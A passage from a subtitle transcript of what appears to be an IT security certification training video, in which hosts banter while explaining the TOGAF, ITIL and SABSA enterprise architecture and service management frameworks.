means?\n&gt;&gt; So [LAUGH] I don't know what it means\n\n325\n00:14:01.935 --> 00:14:06.615\nother places, but here in Gainesville,\nFlorida, redundancy means to do something\n\n326\n00:14:06.615 --> 00:14:10.595\nagain unnecessarily.\n&gt;&gt; Right, now it's interesting actually.\n\n327\n00:14:10.595 --> 00:14:15.070\nSo we quite often in IT will refer to\nredundant systems, which means that we're\n\n328\n00:14:15.070 --> 00:14:16.990\nadding in resilience.\n&gt;&gt; Right.\n\n329\n00:14:16.990 --> 00:14:17.740\n&gt;&gt; Right, but\n\n330\n00:14:17.740 --> 00:14:20.290\nwhen we talk about redundancy in the UK,\n\n331\n00:14:20.290 --> 00:14:22.950\nredundancy means to be laid off work.\n&gt;&gt; Really?\n\n332\n00:14:22.950 --> 00:14:24.630\n&gt;&gt; Yes, you're being redundant,\n\n333\n00:14:24.630 --> 00:14:27.710\nwhich means that you are redundant-\n&gt;&gt; A robot does your job now, so\n\n334\n00:14:27.710 --> 00:14:28.563\nwe don't need you anymore.\n\n335\n00:14:28.563 --> 00:14:29.180\n[LAUGH]\n&gt;&gt; Yeah, so\n\n336\n00:14:29.180 --> 00:14:31.600\nyou're superflous to requirements.\n&gt;&gt; Right.\n\n337\n00:14:31.600 --> 00:14:32.430\n&gt;&gt; Yeah, so\n\n338\n00:14:32.430 --> 00:14:34.130\nit kind of means the same thing.\n\n339\n00:14:34.130 --> 00:14:36.790\nAnd the explanation that you gave\nkind of means the same thing.\n\n340\n00:14:36.790 --> 00:14:37.564\n&gt;&gt; Right, right.\n\n341\n00:14:37.564 --> 00:14:38.840\n&gt;&gt; But actually we take it\n\n342\n00:14:38.840 --> 00:14:42.346\nto a completely different interpretation.\n&gt;&gt; Yeah, they share some of the same DNA,\n\n343\n00:14:42.346 --> 00:14:44.320\nbut right, exactly.\n&gt;&gt; Yeah, so see, look at this, that's has\n\n344\n00:14:44.320 --> 00:14:46.342\nbeen an interesting conversation already-\n&gt;&gt; It has been.\n\n345\n00:14:46.342 --> 00:14:47.460\n&gt;&gt; For everybody.\n\n346\n00:14:47.460 --> 00:14:52.394\nSo this is what we're trying to do here in\nour architecture development model is what\n\n347\n00:14:52.394 --> 00:14:54.833\nwe're looking for redundancy options.\n\n348\n00:14:54.833 --> 00:14:57.689\nAnd I mean redundancy in\nkind of both of our ways,\n\n349\n00:14:57.689 --> 00:15:01.740\nin that we're looking to see what's\nsuperfluous to requirements.\n\n350\n00:15:01.740 --> 00:15:05.946\nWe're looking to see,\nwhat are we doing, not just physically,\n\n351\n00:15:05.946 --> 00:15:08.021\nbut also process-led as well.\n\n352\n00:15:08.021 --> 00:15:13.600\nWhat are we doing that is superfluous to\nthe requirements of the organization?\n\n353\n00:15:14.890 --> 00:15:19.140\nAnd then we want, well, we have our\nguidelines, our architecture development\n\n354\n00:15:19.140 --> 00:15:23.670\nmodel guidelines and techniques,\na collection of techniques.\n\n355\n00:15:23.670 --> 00:15:27.010\nThis is what we could do to\nimplement this particular model.\n\n356\n00:15:27.010 --> 00:15:31.320\nSo this is how we could\norganize ourselves.\n\n357\n00:15:31.320 --> 00:15:33.270\nAnd our content framework, well,\n\n358\n00:15:33.270 --> 00:15:38.020\nthe content framework are examples of\nthe sorts of things that we could do.\n\n359\n00:15:38.020 --> 00:15:39.830\nNow, where do you go when you wanna\n\n360\n00:15:39.830 --> 00:15:41.810\nknow something?\n&gt;&gt; Google.\n\n361\n00:15:41.810 --> 00:15:42.720\n&gt;&gt; Right, and so\n\n362\n00:15:42.720 --> 00:15:43.420\nI'm-\n&gt;&gt; The oracle of\n\n363\n00:15:43.420 --> 00:15:44.267\nthe Internet, as we call it.\n\n364\n00:15:44.267 --> 00:15:45.604\n[LAUGH]\n&gt;&gt; Exactly, now,\n\n365\n00:15:45.604 --> 00:15:48.120\nJustin goes to his mom first, by the way.\n&gt;&gt; Yeah, he does, he does.\n\n366\n00:15:48.120 --> 00:15:48.680\n&gt;&gt; Yeah, he does.\n\n367\n00:15:48.680 --> 00:15:49.249\n&gt;&gt; He's a smart man.\n\n368\n00:15:51.470 --> 00:15:52.473\n&gt;&gt; Well, I'd reckon-\n\n369\n00:15:52.473 --> 00:15:53.730\n&gt;&gt; That's why he's a software developer\n\n370\n00:15:53.730 --> 00:15:54.609\nand I just do the security.\n\n371\n00:15:54.609 --> 00:15:55.783\n[LAUGH]\n&gt;&gt; Yeah, yeah,\n\n372\n00:15:55.783 --> 00:15:57.808\nI reckon I'd go to Justin's mom\nfirst before I'd go to Google.\n\n373\n00:15:57.808 --> 00:15:59.778\nBut anyway, We got to Google.\n\n374\n00:15:59.778 --> 00:16:03.157\nGoogle's gonna give you\nlots of information.\n\n375\n00:16:03.157 --> 00:16:07.390\nJust always remember,\nthis is a caveat I gave to everybody,\n\n376\n00:16:07.390 --> 00:16:11.131\nwhat's out there is not\nnecessary going to help you.\n\n377\n00:16:11.131 --> 00:16:14.443\nBecause what's out there is\nsomebody else's opinion and\n\n378\n00:16:14.443 --> 00:16:17.898\nit's up to you to take that and\nadapt it to your environment.\n\n379\n00:16:17.898 --> 00:16:22.590\nBut there's lot of useful information\nout there that where people have written\n\n380\n00:16:22.590 --> 00:16:27.515\nwhite papers etc., that could\nhelp you to achieve exactly this.\n\n381\n00:16:27.515 --> 00:16:32.040\nAnd then we wanna take a look\nat our tools and our taxonomies,\n\n382\n00:16:32.040 --> 00:16:35.540\nhow are we going to utilize\ntools to achieve what?\n\n383\n00:16:36.660 --> 00:16:38.390\nThat's an important thing as well.\n\n384\n00:16:38.390 --> 00:16:42.650\nJust remember, when you're bringing in\na tool, you bring in a tool to facilitate\n\n385\n00:16:42.650 --> 00:16:46.790\nan outcome, you don't adjust\nthe outcome to suit the tool.\n\n386\n00:16:46.790 --> 00:16:48.320\n&gt;&gt; Right, you're not trying to,\n\n387\n00:16:48.320 --> 00:16:49.990\nwhat do they say?\n\n388\n00:16:49.990 --> 00:16:51.650\nI'm hammer looking for a nail?\n\n389\n00:16:51.650 --> 00:16:52.670\n&gt;&gt; Right.\n&gt;&gt; Yeah.\n\n390\n00:16:52.670 --> 00:16:55.930\n&gt;&gt; Yeah, exactly, that's not what we want.\n\n391\n00:16:55.930 --> 00:16:58.920\nWe wanna get the nail first, and\nthen we gotta find the right hammer.\n\n392\n00:16:58.920 --> 00:16:59.531\n&gt;&gt; [CROSSTALK]\n\n393\n00:16:59.531 --> 00:17:02.411\n&gt;&gt; Yeah, exactly, so then we've got also\n\n394\n00:17:02.411 --> 00:17:08.270\nour reference models, and our reference\nmodels again, this is what has worked.\n\n395\n00:17:08.270 --> 00:17:11.920\nThis is what has worked,\nthis is our reference.\n\n396\n00:17:11.920 --> 00:17:16.100\nAnd our capability framework is actually\nlooking at this is where we look at\n\n397\n00:17:16.100 --> 00:17:22.090\nthe processes and the organization that we\nneed to support our architecture model for\n\n398\n00:17:22.090 --> 00:17:23.930\nour organization.\n\n399\n00:17:23.930 --> 00:17:28.110\nSo this ADM that we've talked about, the\narchitecture development model, of course,\n\n400\n00:17:28.110 --> 00:17:32.540\nthis is the big achievement from TOGAF.\n\n401\n00:17:32.540 --> 00:17:35.140\nAnd we've got nine steps\nto achieving that.\n\n402\n00:17:35.140 --> 00:17:35.990\nAnd look at this,\n\n403\n00:17:35.990 --> 00:17:38.540\nthis is based on CSI again.\n&gt;&gt; Yeah.\n\n404\n00:17:38.540 --> 00:17:39.280\n&gt;&gt; Yeah, this is-\n\n405\n00:17:39.280 --> 00:17:40.450\n&gt;&gt; I saw it right away.\n\n406\n00:17:40.450 --> 00:17:41.256\n&gt;&gt; Right, yeah,\n\n407\n00:17:41.256 --> 00:17:43.682\nthis is investigating\nwhere we are right now.\n\n408\n00:17:43.682 --> 00:17:47.879\nThink about our governance and\nour structure and then agree where we\n\n409\n00:17:47.879 --> 00:17:52.600\nwant to be and then articulate that\nbusiness and our systems architecture.\n\n410\n00:17:52.600 --> 00:17:55.227\nDefine the technology architecture.\n\n411\n00:17:55.227 --> 00:17:58.243\nSo this is all part of\nwhere do we want to be?\n\n412\n00:17:58.243 --> 00:18:01.750\nAnd then evaluating opportunities and\nplan for migration and\n\n413\n00:18:01.750 --> 00:18:05.197\nplan implementation that's\nhow we're going to get there.\n\n414\n00:18:05.197 --> 00:18:08.804\nIncluding our change management\nwhich is the specifics of how\n\n415\n00:18:08.804 --> 00:18:10.406\nwe're going to get there.\n\n416\n00:18:10.406 --> 00:18:14.930\nAnd all of that is what I call CSI\nwhich is continual service improvement.\n\n417\n00:18:14.930 --> 00:18:16.701\nAnd where do I get CSI from?\n\n418\n00:18:16.701 --> 00:18:19.340\nWell I get CSI from here.\n\n419\n00:18:19.340 --> 00:18:22.080\nNow we will have to because I put\nthis in the bottom right-hand\n\n420\n00:18:22.080 --> 00:18:24.050\ncorner of this slide we have.\n&gt;&gt; [LAUGH] Which where your head is.\n\n421\n00:18:24.050 --> 00:18:25.480\n&gt;&gt; Yeah, which is where my head is, but\n\n422\n00:18:25.480 --> 00:18:26.290\nthat's okay.\n\n423\n00:18:26.290 --> 00:18:27.390\nPeople don't need to see me.\n\n424\n00:18:27.390 --> 00:18:31.830\nFor anybody that’s seeing me, you'll\nhave seen me in conjunction with this\n\n425\n00:18:31.830 --> 00:18:34.167\nparticular diagram anyway.\n&gt;&gt;

I don't know if that's a good thing or\n\n429\n00:18:39.150 --> 00:18:40.659\na bad thing.\n&gt;&gt; It's sounds like a little bit like,\n\n430\n00:18:40.659 --> 00:18:41.330\nJill, are you okay?\n\n431\n00:18:41.330 --> 00:18:42.082\nCan we get a doctor?\n\n432\n00:18:42.082 --> 00:18:43.636\n[LAUGH]\n&gt;&gt;

Yeah,\n\n444\n00:18:56.320 --> 00:18:57.880\nwe have front-loaders in Europe.\n&gt;&gt; Yeah, I guess so.\n\n445\n00:18:57.880 --> 00:19:00.350\n&gt;&gt; So we don't have the top-loaders.\n\n446\n00:19:00.350 --> 00:19:02.990\nSo right in the middle in there,\nwe've got strategy.\n\n447\n00:19:02.990 --> 00:19:07.200\nAnd then we've got design, and transition,\nand operation around the outside.\n\n448\n00:19:07.200 --> 00:19:11.040\nAnd then we've got,\nright around the outside is CSI.\n\n449\n00:19:11.040 --> 00:19:12.010\nWhat does all that mean?\n\n450\n00:19:12.010 --> 00:19:15.521\nCuz that just sounds like a bunch of\nwords to you, probably, and that's okay.\n\n451\n00:19:15.521 --> 00:19:18.294\n&gt;&gt;

I tilled this up man, it's awesome.\n\n471\n00:20:27.058 --> 00:20:28.626\n[LAUGH]\n&gt;&gt; Yeah.\n\n472\n00:20:28.626 --> 00:20:33.882\n[LAUGH] So strategy looks at where we get\nour ideas from, how we get our ideas,\n\n473\n00:20:33.882 --> 00:20:37.845\nand how we decide how we're\ngoing to govern within IT..\n\n474\n00:20:37.845 --> 00:20:39.360\nSo Cope is going to help us with that.\n\n475\n00:20:40.410 --> 00:20:43.643\nSo that service strategy, and\nthen once we've had that idea,\n\n476\n00:20:43.643 --> 00:20:46.938\nat the end of service strategy,\nthe business case is approved.\n\n477\n00:20:46.938 --> 00:20:49.670\nAnd then we move into service design.\n\n478\n00:20:49.670 --> 00:20:51.790\nAnd in design we've got processes for\n\n479\n00:20:51.790 --> 00:20:56.675\nthe design of a service, project\nmanagement is going to help us with that.\n\n480\n00:20:56.675 --> 00:20:59.765\nSo PMP,\nPrints two is gonna help us with that.\n\n481\n00:20:59.765 --> 00:21:03.563\nAnd as well with service transition and\nservice transition is where we and\n\n482\n00:21:03.563 --> 00:21:05.870\nthis is really important by the way.\n\n483\n00:21:05.870 --> 00:21:11.080\nDesign is where we have processes in\nplace such as it security management.\n\n484\n00:21:11.080 --> 00:21:14.670\nSo this is where in service design this\nis something you need to remember,\n\n485\n00:21:14.670 --> 00:21:18.940\nthe service design this is where\nwe define our IT security.\n\n486\n00:21:18.940 --> 00:21:22.670\nSo this is where all of the particular\nmodels that you've been talking about and\n\n487\n00:21:22.670 --> 00:21:26.460\neverything you've been looking at\nwith Daniel that's where this happens\n\n488\n00:21:26.460 --> 00:21:27.970\nin service design.\n\n489\n00:21:27.970 --> 00:21:32.740\nIn service design, we also define\nwhat we call service level targets.\n\n490\n00:21:32.740 --> 00:21:36.100\nYou know, you've heard of those SOAs and\nservice level agreements.\n\n491\n00:21:36.100 --> 00:21:39.660\nWell, we have targets for\nboth security and also, for\n\n492\n00:21:39.660 --> 00:21:44.410\ncontinuity as well,\nwhich is part of security.\n\n493\n00:21:44.410 --> 00:21:46.670\nWell, it's not part of security in IT,\n\n494\n00:21:46.670 --> 00:21:51.134\nit's what we would consider to be part\nof security for this particular series.\n\n495\n00:21:51.134 --> 00:21:56.047\nSo in service design we agree\nthe parameters within which we're going to\n\n496\n00:21:56.047 --> 00:22:01.039\ndeliver and then operate the service and\nin transition we built, test and\n\n497\n00:22:01.039 --> 00:22:02.320\nimplement.\n\n498\n00:22:02.320 --> 00:22:06.884\nNow in transition, in service\ntransition not only are we doing\n\n499\n00:22:06.884 --> 00:22:11.380\nall of the project management work, but\nwe're also performing asset management.\n\n500\n00:22:11.380 --> 00:22:13.660\nSo service, asset and\nconfiguration management and\n\n501\n00:22:13.660 --> 00:22:16.580\nall of the policies that\nsurround asset management\n\n502\n00:22:16.580 --> 00:22:21.940\nare being performed in service\ntransition as well as change management.\n\n503\n00:22:21.940 --> 00:22:27.330\nSo again, these are policies that will\nencroach on what we're looking at here.\n\n504\n00:22:27.330 --> 00:22:32.490\nAnd then once that is transitioned into\nthe live environment, then we operate.\n\n505\n00:22:32.490 --> 00:22:36.920\nAnd so all of those service level\ntargets that we set in service design,\n\n506\n00:22:36.920 --> 00:22:40.330\nthat's what we have to\ndeliver in service operation.\n\n507\n00:22:40.330 --> 00:22:43.310\nI call service operation BAU,\nbusiness as usual.\n\n508\n00:22:44.410 --> 00:22:46.240\nAnd that's all it is really.\n\n509\n00:22:46.240 --> 00:22:49.680\nIt's just the treading waters,\nthe business as usual.\n\n510\n00:22:49.680 --> 00:22:54.730\nCSI though is all-encompassing\nbecause CSI is responsible for\n\n511\n00:22:54.730 --> 00:22:58.660\nensuring that we remain\naligned to the organization.\n\n512\n00:22:58.660 --> 00:23:02.920\nSo CSI is embedded into absolutely\neverything/ It's sneaky little thing,\n\n513\n00:23:02.920 --> 00:23:04.810\nit's got its tendrils everywhere.\n\n514\n00:23:04.810 --> 00:23:09.283\nBut it makes sure that we have\nan alignment with the organizations,\n\n515\n00:23:09.283 --> 00:23:12.743\nthat we understand what\nour organization is doing.\n\n516\n00:23:12.743 --> 00:23:16.106\nAnd that we're able to adapt to\nsuit that need because otherwise,\n\n517\n00:23:16.106 --> 00:23:18.580\nthe organization is going\nto go somewhere else.\n\n518\n00:23:19.610 --> 00:23:24.172\nThe focus with ITIL is on efficiency and\neffectiveness, that is.\n\n519\n00:23:24.172 --> 00:23:24.696\n&gt;&gt; This is why you\n\n520\n00:23:24.696 --> 00:23:25.336\nlike it so much.\n\n521\n00:23:25.336 --> 00:23:26.090\n&gt;&gt; Right.\n&gt;&gt; [LAUGH]\n\n522\n00:23:26.090 --> 00:23:27.250\n&gt;&gt; Yeah, this is where you're going to\n\n523\n00:23:27.250 --> 00:23:29.860\nfind me banging on about\nefficiency all the time.\n\n524\n00:23:29.860 --> 00:23:32.220\nBecause this is about\nminimizing bureaucracy,\n\n525\n00:23:32.220 --> 00:23:34.890\nthat's exactly what we want to do.\n\n526\n00:23:34.890 --> 00:23:35.990\nSo that's ITIL, and\n\n527\n00:23:35.990 --> 00:23:39.760\nlike I said we've got a whole other\nseries well lots of series on that.\n\n528\n00:23:39.760 --> 00:23:43.390\nSo if you want to find out more,\ngo and check them out there.\n\n529\n00:23:43.390 --> 00:23:45.948\nAnd then we've got something called,\nSABSA.\n\n530\n00:23:45.948 --> 00:23:48.957\nAnd this is the last we're gonna look\nat in this particular episode and\n\n531\n00:23:48.957 --> 00:23:52.017\nthen in fact I'm actually gonna\nleave you in Daniel's capable hands,\n\n532\n00:23:52.017 --> 00:23:52.943\nafter this episode.\n\n533\n00:23:52.943 --> 00:23:57.295\nA SABSA is.\n&gt;&gt; An 80s soft drink [LAUGH] right?\n\n534\n00:23:57.295 --> 00:23:59.150\nSounds like it [LAUGH].\n&gt;&gt; [LAUGH] Is it?\n\n535\n00:23:59.150 --> 00:23:59.840\nI know, it sounds like it, isn't it?\n\n536\n00:23:59.840 --> 00:24:02.165\nI wonder,\nit might be full of chemicals though.\n\n537\n00:24:02.165 --> 00:24:03.860\n&gt;&gt; [LAUGH] Gimme a SABSA.\n\n538\n00:24:03.860 --> 00:24:05.400\n&gt;&gt; Yeah [LAUGH],\n\n539\n00:24:05.400 --> 00:24:07.470\nonly if it's got something\na little bit stronger in it.\n\n540\n00:24:07.470 --> 00:24:10.035\nThen I'm up for that.\n&gt;&gt; It's got sucralose or something.\n\n541\n00:24:10.035 --> 00:24:15.120\n[LAUGH]\n&gt;&gt; No, yeah, so SABSA is, well it tells\n\n542\n00:24:15.120 --> 00:24:19.320\nyou here, it's a risk-driven approach to\nmanaging the enterprise architecture.\n\n543\n00:24:20.330 --> 00:24:25.080\nSo it's similar to TOGAF in that\nit sits at the very top, and\n\n544\n00:24:25.080 --> 00:24:27.580\nit's looking at the entire\nIT architecture.\n\n545\n00:24:28.750 --> 00:24:32.250\nSo you might wanna bring in COBIT and\nITIL as well.\n\n546\n00:24:32.250 --> 00:24:37.463\nSABSA gives you that integration layer\nthat sits at our governance level,\n\n547\n00:24:37.463 --> 00:24:42.509\nthe integration between business as usual,\nthe project management and\n\n548\n00:24:42.509 --> 00:24:46.080\nthe operations management and\nthe organization.\n\n549\n00:24:46.080 --> 00:24:50.290\nSo we have six layers in SABSA.\n\n550\n00:24:50.290 --> 00:24:54.251\nAnd I'm going to start off at the bottom\nbecause it's really, I like to make things\n\n551\n00:24:54.251 --> 00:24:56.700\na little bit different here.\n&gt;&gt; [LAUGH] Like to flip script right?\n\n552\n00:24:56.700 --> 00:24:57.235\n&gt;&gt; Yeah, I have got\n\n553\n00:24:57.235 --> 00:24:58.130\nto.\n&gt;&gt; Yeah.\n\n554\n00:24:58.130 --> 00:24:58.837\n&gt;&gt; I wouldn't be me if\n\n555\n00:24:58.837 --> 00:24:59.372\nI was normal.\n\n556\n00:24:59.372 --> 00:25:00.150\n&gt;&gt; That's right.\n&gt;&gt; Yeah.\n\n557\n00:25:00.150 --> 00:25:01.360\n&gt;&gt; That's why we love\n\n558\n00:25:01.360 --> 00:25:02.190\nyou.\n&gt;&gt; So\n\n559\n00:25:02.190 --> 00:25:04.550\nwe start off at the bottom\nwith service management.\n\n560\n00:25:04.550 --> 00:25:07.270\nNow there is itil and I am not going\nto say anything more about that.\n\n561\n00:25:07.270 --> 00:25:10.070\nThat's business as usual.\n\n562\n00:25:10.070 --> 00:25:12.690\nBut then we also have our\ncomponent architecture.\n\n563\n00:25:12.690 --> 00:25:16.268\nAnd the reason I'm gonna start off at\nthe bottom is because service management\n\n564\n00:25:16.268 --> 00:25:21.060\nmanages the day-to-day components.\n\n565\n00:25:21.060 --> 00:25:24.050\nThe components are this thing that\nsat on the desk here right now,\n\n566\n00:25:24.050 --> 00:25:25.550\nthis is a component.\n\n567\n00:25:25.550 --> 00:25:28.910\nA component is a part of a service.\n\n568\n00:25:28.910 --> 00:25:31.120\nIt can either be tangible or intangible.\n\n569\n00:25:31.120 --> 00:25:33.936\nWe can talk about capabilities\nas components as well, but\n\n570\n00:25:33.936 --> 00:25:36.480\nwe're not gonna get too\nmuch into depth on that.\n\n571\n00:25:36.480 --> 00:25:40.410\nBut a component is a tangible\npart of a service,\n\n572\n00:25:40.410 --> 00:25:42.850\nor a configuration item of a service.\n\n573\n00:25:42.850 --> 00:25:44.700\nSo that's a component architecture.\n\n574\n00:25:44.700 --> 00:25:47.070\nWe have to know what components we've got.\n\n575\n00:25:47.070 --> 00:25:49.430\nWe do that in asset management.\n\n576\n00:25:49.430 --> 00:25:53.520\nBut then we have to then think\nabout our physical architecture and\n\n577\n00:25:53.520 --> 00:25:56.730\nthat's our network topology,\nhow all of this hangs together.\n\n578\n00:25:57.950 --> 00:26:01.698\nWhere this service sits,\nwhere this particular PC sits,\n\n579\n00:26:01.698 --> 00:26:05.990\nwhat IP address it has,\nthis is all of our physical architecture.\n\n580\n00:26:05.990 --> 00:26:10.693\nAnd then we have our logical architecture,\nbecause let's face it,\n\n581\n00:26:10.693 --> 00:26:15.589\nour physical architecture's not\nthe be-all and end-all right now.\n\n582\n00:26:15.589 --> 00:26:17.630\nYeah, because we're in the 21st century.\n&gt;&gt; That's right.\n\n583\n00:26:17.630 --> 00:26:19.136\n&gt;&gt; I mean, I don't know how many\n\n584\n00:26:19.136 --> 00:26:22.118\npartitions you've got on that, but.\n&gt;&gt; Quite a few cloud\n\n585\n00:26:22.118 --> 00:26:23.160\ntechnologies.\n&gt;&gt; Right.\n\n586\n00:26:23.160 --> 00:26:23.841\n&gt;&gt; Virtualizations.\n\n587\n00:26:23.841 --> 00:26:24.341\n&gt;&gt; Yeah.\n\n588\n00:26:24.341 --> 00:26:25.861\n&gt;&gt; It's all over the map now.\n\n589\n00:26:25.861 --> 00:26:28.571\n&gt;&gt; Yeah and we got a lot of sort of VMs\n\n590\n00:26:28.571 --> 00:26:33.320\nand so we are not going to just\nconcentrate on the physical architecture\n\n591\n00:26:33.320 --> 00:26:37.580\nbecause that's only give you a very small\nportion of what your infrastructure\n\n592\n00:26:37.580 --> 00:26:38.481\nreally looks like.\n&gt;&gt; So\n\n593\n00:26:38.481 --> 00:26:41.510\nthat brings us to logical architecture?\n&gt;&gt; That's our\n\n594\n00:26:41.510 --> 00:26:42.702\nlogical architecture.\n\n595\n00:26:42.702 --> 00:26:43.433\n&gt;&gt; Right.\n&gt;&gt; Right.\n\n596\n00:26:43.433 --> 00:26:46.085\nSo let's say I had my PC partitioned into\n\n597\n00:26:46.085 --> 00:26:50.771\nthree different drives, then that\nwould be my logical architecture.\n\n598\n00:26:50.771 --> 00:26:52.342\n&gt;&gt; Got ya.\n\n599\n00:26:52.342 --> 00:26:54.395\n&gt;&gt; Now what I'm going to do though is that\n\n600\n00:26:54.395 --> 00:26:58.360\nI'm going to look at my\nconceptual architecture.\n\n601\n00:26:58.360 --> 00:27:00.640\nNow, a service is made up of components.\n\n602\n00:27:00.640 --> 00:27:04.020\nThis can be a difficult one to get\nyour head around, so watch out.\n\n603\n00:27:04.020 --> 00:27:09.010\nSo a service is what I'd call a means of\ndelivering value by facilitating outcomes.\n\n604\n00:27:09.010 --> 00:27:11.750\nIn other words,\nit's a way of achieving something.\n\n605\n00:27:11.750 --> 00:27:12.820\nThat's a service.\n\n606\n00:27:12.820 --> 00:27:16.010\nSo a service to an organization It's say,\nan ability,\n\n607\n00:27:16.010 --> 00:27:18.160\nit's an ability to send and receive email.\n&gt;&gt; I like\n\n608\n00:27:18.160 --> 00:27:19.160\nthat.\n&gt;&gt; So\n\n609\n00:27:19.160 --> 00:27:22.520\nlet's think about then what that\nservice is made up of, in other words,\n\n610\n00:27:22.520 --> 00:27:25.477\nwhat do I need to send and receive email?\n&gt;&gt; You gotta have a email\n\n611\n00:27:25.477 --> 00:27:26.090\nserver.\n&gt;&gt; Right.\n\n612\n00:27:26.090 --> 00:27:27.010\n&gt;&gt; You gotta have\n\n613\n00:27:27.010 --> 00:27:28.644\nsoftware that runs on the server.\n&gt;&gt; Yeah.\n\n614\n00:27:28.644 --> 00:27:30.420\n&gt;&gt; Have a connection to the network of\n\n615\n00:27:30.420 --> 00:27:32.240\nsome source.\n&gt;&gt; I got to have the infrastructure, yeah.\n\n616\n00:27:32.240 --> 00:27:33.610\n&gt;&gt; There you go, got to have an endpoint\n\n617\n00:27:33.610 --> 00:27:35.660\nto receive the actual email.\n&gt;&gt; Right.\n\n618\n00:27:35.660 --> 00:27:36.235\n&gt;&gt; A clients.\n\n619\n00:27:36.235 --> 00:27:36.735\n&gt;&gt; Yeah.\n\n620\n00:27:36.735 --> 00:27:38.470\n&gt;&gt; That also receives the email.\n\n621\n00:27:38.470 --> 00:27:40.720\nMaybe some form of encryption if you\n\n622\n00:27:40.720 --> 00:27:41.830\nwant to do that.\n&gt;&gt; Yeah.\n\n623\n00:27:41.830 --> 00:27:42.890\n&gt;&gt; But at least some sort of\n\n624\n00:27:42.890 --> 00:27:44.270\ncommunication.\n&gt;&gt; And\n\n625\n00:27:44.270 --> 00:27:47.004\nwhat about documentation?\n&gt;&gt; You need contracts.\n\n626\n00:27:47.004 --> 00:27:48.224\n&gt;&gt; I just figure that stuff out.\n\n627\n00:27:48.224 --> 00:27:48.980\n[LAUGH]\n&gt;&gt; Yes, [LAUGH] [INAUDIBLE].\n\n628\n00:27:48.980 --> 00:27:52.040\nBut all along is what we call components.\n&gt;&gt; Yeah.\n\n629\n00:27:52.040 --> 00:27:52.980\n&gt;&gt; Each one of those.\n\n630\n00:27:52.980 --> 00:27:55.290\nAnd without any one of those components,\n\n631\n00:27:55.290 --> 00:27:59.470\nthe NAT service cannot\ndeliver its outcome.\n\n632\n00:27:59.470 --> 00:28:00.720\nYou can't send and\n\n633\n00:28:00.720 --> 00:28:03.550\nreceive an email without every\nsingle one of those components.\n\n634\n00:28:03.550 --> 00:28:07.690\nAnd it's really important\nthat we understand\n\n635\n00:28:07.690 --> 00:28:11.150\nwhat components are making up a service?\n\n636\n00:28:11.150 --> 00:28:14.600\nBecause you see, if you have a failure,\na spot, a single point of failure in\n\n637\n00:28:14.600 --> 00:28:18.540\nany one of those components,\nthen you cannot achieve your outcome.\n\n638\n00:28:18.540 --> 00:28:20.200\nYou can't send and receive emails.\n\n639\n00:28:20.200 --> 00:28:23.648\nSo this is our, well this is what we\ncall our conceptual architecture because\n\n640\n00:28:23.648 --> 00:28:27.110\nthe other thing about all of this is that\na lot of these components are shared.\n\n641\n00:28:27.110 --> 00:28:31.275\nYou don't have one network for email and\nthen another network for the Internet and\n\n642\n00:28:31.275 --> 00:28:33.310\nthen another network for Dropbox.\n&gt;&gt; It's all integrated, yeah.\n\n643\n00:28:33.310 --> 00:28:36.380\n&gt;&gt; You have one network, right.\n\n644\n00:28:36.380 --> 00:28:38.790\nSo we have shared components.\n\n645\n00:28:38.790 --> 00:28:43.570\nAnd so this is where then we get into\nthe realms of our contextual architecture,\n\n646\n00:28:43.570 --> 00:28:45.540\nwhich is okay.\n\n647\n00:28:45.540 --> 00:28:49.039\nSo from the user perspective,\nfrom a business perspective,\n\n648\n00:28:49.039 --> 00:28:50.530\nwhat does that mean to me?\n\n649\n00:28:50.530 --> 00:28:54.861\nBecause the user doesn't care how\nmany infrastructure components you\n\n650\n00:28:54.861 --> 00:28:55.398\nhave.\n&gt;&gt; No,\n\n651\n00:28:55.398 --> 00:28:56.140\nthey just care that they sit down and\n\n652\n00:28:56.140 --> 00:28:57.980\njust send their email.\n&gt;&gt; Right, that's it.\n\n653\n00:28:57.980 --> 00:29:00.190\nAll they wanna do is to\nable to sit down and\n\n654\n00:29:00.190 --> 00:29:05.340\njust when they go into Outlook they just\nwanna hit send and that's it, it's gone.\n\n655\n00:29:05.340 --> 00:29:09.180\nOkay, so our contextual\narchitecture is looking at, right?\n\n656\n00:29:09.180 --> 00:29:12.810\nIn conceptual architecture,\nwe're looking at how they hang together.\n\n657\n00:29:12.810 --> 00:29:16.888\nAnd the contextual architecture is looking\nat that from the business perspective.\n\n658\n00:29:16.888 --> 00:29:20.380\nSo if it's looking at it\nfrom their perspective of,\n\n659\n00:29:20.380 --> 00:29:22.550\nall I know is I've got a PC and\nI've got this on it.\n\n660\n00:29:23.680 --> 00:29:24.990\nAnd how it all hangs together.\n\n661\n00:29:24.990 --> 00:29:25.710\nThat's down to us.\n&gt;&gt; Yeah, yeah.\n\n662\n00:29:25.710 --> 00:29:27.820\n&gt;&gt; That's got nothing to do with them.\n\n663\n00:29:27.820 --> 00:29:31.040\nSo as we've said right at the very\nbottom on that last bullet point,\n\n664\n00:29:31.040 --> 00:29:33.720\nit's the last thing I'm gonna\nleave you with right now.\n\n665\n00:29:33.720 --> 00:29:36.640\nSABSA is high level,\nas we've already seen.\n\n666\n00:29:36.640 --> 00:29:40.540\nThe other frameworks manage\nspecific layers in this, and\n\n667\n00:29:40.540 --> 00:29:43.100\nspecific portions of these layers as well.\n\n668\n00:29:43.100 --> 00:29:47.150\nWhereas SABSA itself is\nactually incredibly high level.\n\n669\n00:29:47.150 --> 00:29:48.820\nSo, what we've covered right?\n\n670\n00:29:48.820 --> 00:29:52.400\nIn these two last episodes, is a really,\n\n671\n00:29:52.400 --> 00:29:56.150\nreally, really quick\nrunthrough the frameworks and\n\n672\n00:29:56.150 --> 00:30:00.483\nthe standards that are needed for\nyour test.\n\n673\n00:30:00.483 --> 00:30:04.410\nNow as always, we've got more\ninformation available to you,\n\n674\n00:30:04.410 --> 00:30:08.470\nif you want supplemental\ninformation in our other series.\n\n675\n00:30:08.470 --> 00:30:11.694\nAnd we've got plenty of that, and you know\nwhat, Daniel and I are always here as\n\n676\n00:30:11.694 --> 00:30:14.460\nwell, if you do need any other,\nif you do have any other questions.\n\n677\n00:30:14.460 --> 00:30:16.145\nBut for now I'm gonna go back and\n\n678\n00:30:16.145 --> 00:30:18.780\nleave you in Daniel's capable hands.\n&gt;&gt; Well Jo,\n\n679\n00:30:18.780 --> 00:30:20.260\nit was a pleasure to have you on the show.\n\n680\n00:30:20.260 --> 00:30:22.400\nYou're just a wealth of knowledge\nwhen it comes to this stuff.\n\n681\n00:30:22.400 --> 00:30:26.110\nSo we really appreciate you stopping by\nand sharing that information with us.\n\n682\n00:30:26.110 --> 00:30:28.540\nThat being said it looks like we\nare out of time for this episode.\n\n683\n00:30:28.540 --> 